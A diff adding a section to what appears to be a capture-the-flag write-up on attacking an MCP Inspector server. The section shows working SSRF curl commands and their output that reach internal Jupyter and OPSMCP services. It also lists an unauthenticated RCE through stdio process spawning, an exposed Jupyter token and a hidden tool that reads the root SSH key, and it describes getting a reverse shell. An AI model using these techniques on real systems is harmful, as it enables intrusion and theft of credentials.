@@ -580,7 +580,54 @@ This pulls the page source and the bundle filename is confirmed as `/assets/inde
 ```
 
 **Key finding:** Two critical endpoints surfaced — `/api/mcp/oauth/proxy` (an OAuth proxy ripe for SSRF abuse) and `/api/mcp/connect` (a connection endpoint that accepts `stdio` transport configuration, meaning it can spawn arbitrary processes).
+<div align="center">
+<br>
+<br>
+</div>
 
+### 2.2.5 SSRF — Probing Internal Services via `/api/mcp/oauth/proxy`
+
+**Theory Block — Why the OAuth Proxy is SSRF:**
+The `/api/mcp/oauth/proxy` endpoint exists to forward OAuth token exchange requests to remote authorization servers on behalf of the Inspector UI. This pattern is common in MCP tooling: the backend makes the outbound HTTP call so the frontend doesn't face CORS restrictions. When the `url` parameter is controllable and the server applies no allowlist validation, the endpoint becomes a full SSRF primitive — the server will fetch any URL, including `http://127.0.0.1:*` localhost services the attacker cannot reach directly.
+
+**Command:** `curl -s -X POST "http://TARGET_IP:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:8888/api"}'`
+
+**Breakdown:**
+- `-X POST` — Use HTTP POST method, as the proxy endpoint expects request forwarding.
+- `-d '{"url":"..."}'` — JSON body specifying the internal URL to proxy. The `127.0.0.1` address will be resolved server-side, bypassing external network restrictions.
+
+**Result:**
+```shell
+kali@kali:~$ curl -s -X POST "http://10.129.245.216:6274/api/mcp/oauth/proxy" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:8888/api"}'
+{"status":200,"statusText":"OK","headers":{"server":"TornadoServer/6.5.4","content-type":"application/json"},"body":{"version":"2.17.0"}}
+```
+
+**Key finding:** Jupyter 2.17.0 is running on `TornadoServer/6.5.4` at localhost:8888, and the SSRF is fully functional — the response body is proxied back in the JSON `body` field.
+
+**Command:** `curl -s -X POST "http://TARGET_IP:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:5000/"}'`
+
+**Result:**
+```shell
+kali@kali:~$ curl -s -X POST "http://10.129.245.216:6274/api/mcp/oauth/proxy" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:5000/"}'
+{"status":200,"statusText":"OK","headers":{"server":"Werkzeug/3.1.6 Python/3.10.12"},"body":{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}}
+```
+
+**Key finding:** A second internal service — OPSMCP 2.1.0 on Werkzeug/Flask — is running at localhost:5000. Its index response reveals three endpoints and that an `X-API-Key` header is required for authentication.
+
+### 2.2.5 Vulnerability Research & Analysis
+
+| Service | Version | Vulnerability Class | Notes |
+|---------|---------|--------------------|----|
+| MCPJam Inspector `/api/mcp/oauth/proxy` | 1.4.2 | SSRF (no allowlist) | Full internal network access via proxied HTTP requests |
+| MCPJam Inspector `/api/mcp/connect` | 1.4.2 | Unauthenticated RCE via stdio transport | Spawns arbitrary OS processes as the service user |
+| Jupyter Lab | 2.17.0 | Token exposed in `ps aux` (process argument) | Tokens visible to all users with process listing rights |
+| OPSMCP | 2.1.0 | Hidden tool with no secondary authorization | `ops._admin_dump` not in `/tools/list` but callable; reads `/root/.ssh/id_rsa` |
+
+The stdio transport vulnerability in `/api/mcp/connect` is the most critical — MCP stdio transport works by spawning a child process and communicating with it over stdin/stdout using JSON-RPC. The Inspector accepts a `serverConfig` object with a `command` and `args` array, passing them directly to `child_process.spawn()` without any validation. Sending a Python reverse shell as the `command`/`args` results in immediate code execution as the `mcp-dev` service account.
 <div align="center">
 <br>
 <br>
